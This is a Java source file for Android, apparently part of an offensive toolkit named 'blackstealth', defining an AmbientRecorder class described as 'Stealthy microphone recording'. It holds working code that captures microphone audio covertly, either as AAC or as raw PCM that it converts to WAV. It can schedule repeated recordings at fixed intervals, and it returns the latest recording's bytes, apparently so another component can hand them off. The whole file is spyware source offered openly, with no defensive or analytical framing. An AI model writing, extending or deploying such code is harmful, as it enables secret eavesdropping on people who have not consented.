package com.offensive.blackstealth.media;

import android.content.Context;
import android.media.*;
import android.util.Log;
import java.io.*;
import java.util.concurrent.*;

/**
 * Ambient Audio Recorder
 * Stealthy microphone recording
 */
public class AmbientRecorder {
    private static final String TAG = "AmbientRecorder";
    
    private Context context;
    private MediaRecorder mediaRecorder;
    private AudioRecord audioRecord;
    private File outputDir;
    private File currentFile;
    private ExecutorService executor;
    private ScheduledExecutorService scheduler;
    private boolean isRecording = false;
    private RecordingCallback callback;
    
    // Audio settings
    private static final int SAMPLE_RATE = 44100;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    
    public interface RecordingCallback {
        void onRecordingComplete(File file, long durationMs);
        void onError(String error);
    }
    
    public AmbientRecorder(Context context) {
        this.context = context;
        this.executor = Executors.newSingleThreadExecutor();
        this.scheduler = Executors.newScheduledThreadPool(1);
        
        outputDir = new File(context.getFilesDir(), "audio");
        outputDir.mkdirs();
    }
    
    public void setCallback(RecordingCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Start recording with MediaRecorder (AAC format)
     */
    public void startRecording(int maxDurationSeconds) {
        if (isRecording) return;
        
        executor.submit(() -> {
            try {
                currentFile = new File(outputDir, 
                    "rec_" + System.currentTimeMillis() + ".m4a");
                
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                mediaRecorder.setAudioEncodingBitRate(128000);
                mediaRecorder.setAudioSamplingRate(SAMPLE_RATE);
                mediaRecorder.setOutputFile(currentFile.getAbsolutePath());
                mediaRecorder.setMaxDuration(maxDurationSeconds * 1000);
                
                mediaRecorder.setOnInfoListener((mr, what, extra) -> {
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        stopRecording();
                    }
                });
                
                mediaRecorder.prepare();
                mediaRecorder.start();
                isRecording = true;
                
                Log.i(TAG, "Recording started: " + currentFile.getName());
                
            } catch (Exception e) {
                Log.e(TAG, "Recording failed: " + e.getMessage());
                if (callback != null) callback.onError(e.getMessage());
            }
        });
    }
    
    /**
     * Stop recording
     */
    public void stopRecording() {
        if (!isRecording) return;
        
        try {
            isRecording = false;
            
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
            }
            
            if (currentFile != null && currentFile.exists()) {
                long duration = getAudioDuration(currentFile);
                Log.i(TAG, "Recording complete: " + currentFile.length() + " bytes");
                
                if (callback != null) {
                    callback.onRecordingComplete(currentFile, duration);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Stop recording failed: " + e.getMessage());
        }
    }
    
    /**
     * Record raw PCM audio (lower level, more control)
     */
    public void startRawRecording(int durationSeconds) {
        if (isRecording) return;
        
        executor.submit(() -> {
            try {
                int bufferSize = AudioRecord.getMinBufferSize(
                    SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT) * 2;
                
                audioRecord = new AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, bufferSize);
                
                currentFile = new File(outputDir, 
                    "raw_" + System.currentTimeMillis() + ".pcm");
                FileOutputStream fos = new FileOutputStream(currentFile);
                
                byte[] buffer = new byte[bufferSize];
                audioRecord.startRecording();
                isRecording = true;
                
                long startTime = System.currentTimeMillis();
                long maxTime = durationSeconds * 1000L;
                
                Log.i(TAG, "Raw recording started");
                
                while (isRecording && 
                       (System.currentTimeMillis() - startTime) < maxTime) {
                    int read = audioRecord.read(buffer, 0, bufferSize);
                    if (read > 0) {
                        fos.write(buffer, 0, read);
                    }
                }
                
                fos.close();
                audioRecord.stop();
                audioRecord.release();
                audioRecord = null;
                isRecording = false;
                
                // Convert to WAV
                File wavFile = convertPcmToWav(currentFile);
                currentFile.delete();
                
                if (callback != null) {
                    callback.onRecordingComplete(wavFile, durationSeconds * 1000L);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Raw recording failed: " + e.getMessage());
                if (callback != null) callback.onError(e.getMessage());
            }
        });
    }
    
    /**
     * Schedule periodic recordings
     */
    public void scheduleRecordings(int intervalMinutes, int durationSeconds) {
        scheduler.scheduleAtFixedRate(() -> {
            startRecording(durationSeconds);
        }, 0, intervalMinutes, TimeUnit.MINUTES);
        
        Log.i(TAG, "Scheduled recordings: " + durationSeconds + "s every " + 
              intervalMinutes + " min");
    }
    
    /**
     * Stop scheduled recordings
     */
    public void stopScheduledRecordings() {
        scheduler.shutdownNow();
        scheduler = Executors.newScheduledThreadPool(1);
    }
    
    /**
     * Convert PCM to WAV format
     */
    private File convertPcmToWav(File pcmFile) throws IOException {
        File wavFile = new File(pcmFile.getParent(), 
            pcmFile.getName().replace(".pcm", ".wav"));
        
        FileInputStream fis = new FileInputStream(pcmFile);
        FileOutputStream fos = new FileOutputStream(wavFile);
        
        long audioLength = pcmFile.length();
        long dataLength = audioLength + 36;
        int channels = 1;
        int byteRate = SAMPLE_RATE * 2 * channels;
        
        // WAV header
        byte[] header = new byte[44];
        
        // RIFF chunk
        header[0] = 'R'; header[1] = 'I'; header[2] = 'F'; header[3] = 'F';
        header[4] = (byte)(dataLength & 0xff);
        header[5] = (byte)((dataLength >> 8) & 0xff);
        header[6] = (byte)((dataLength >> 16) & 0xff);
        header[7] = (byte)((dataLength >> 24) & 0xff);
        header[8] = 'W'; header[9] = 'A'; header[10] = 'V'; header[11] = 'E';
        
        // fmt chunk
        header[12] = 'f'; header[13] = 'm'; header[14] = 't'; header[15] = ' ';
        header[16] = 16; header[17] = 0; header[18] = 0; header[19] = 0;
        header[20] = 1; header[21] = 0;
        header[22] = (byte) channels; header[23] = 0;
        header[24] = (byte)(SAMPLE_RATE & 0xff);
        header[25] = (byte)((SAMPLE_RATE >> 8) & 0xff);
        header[26] = (byte)((SAMPLE_RATE >> 16) & 0xff);
        header[27] = (byte)((SAMPLE_RATE >> 24) & 0xff);
        header[28] = (byte)(byteRate & 0xff);
        header[29] = (byte)((byteRate >> 8) & 0xff);
        header[30] = (byte)((byteRate >> 16) & 0xff);
        header[31] = (byte)((byteRate >> 24) & 0xff);
        header[32] = (byte)(2 * channels); header[33] = 0;
        header[34] = 16; header[35] = 0;
        
        // data chunk
        header[36] = 'd'; header[37] = 'a'; header[38] = 't'; header[39] = 'a';
        header[40] = (byte)(audioLength & 0xff);
        header[41] = (byte)((audioLength >> 8) & 0xff);
        header[42] = (byte)((audioLength >> 16) & 0xff);
        header[43] = (byte)((audioLength >> 24) & 0xff);
        
        fos.write(header);
        
        // Copy audio data
        byte[] buffer = new byte[4096];
        int read;
        while ((read = fis.read(buffer)) != -1) {
            fos.write(buffer, 0, read);
        }
        
        fis.close();
        fos.close();
        
        return wavFile;
    }
    
    private long getAudioDuration(File file) {
        try {
            MediaMetadataRetriever retriever = new MediaMetadataRetriever();
            retriever.setDataSource(file.getAbsolutePath());
            String duration = retriever.extractMetadata(
                MediaMetadataRetriever.METADATA_KEY_DURATION);
            retriever.release();
            return Long.parseLong(duration);
        } catch (Exception e) {
            return 0;
        }
    }
    
    public File getLatestRecording() {
        File[] files = outputDir.listFiles();
        if (files != null && files.length > 0) {
            File latest = files[0];
            for (File f : files) {
                if (f.lastModified() > latest.lastModified()) {
                    latest = f;
                }
            }
            return latest;
        }
        return null;
    }
    
    public byte[] getRecordingData(File file) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                baos.write(buffer, 0, read);
            }
            fis.close();
            return baos.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }
    
    public boolean isRecording() {
        return isRecording;
    }
    
    public void release() {
        stopRecording();
        stopScheduledRecordings();
        executor.shutdown();
    }
}
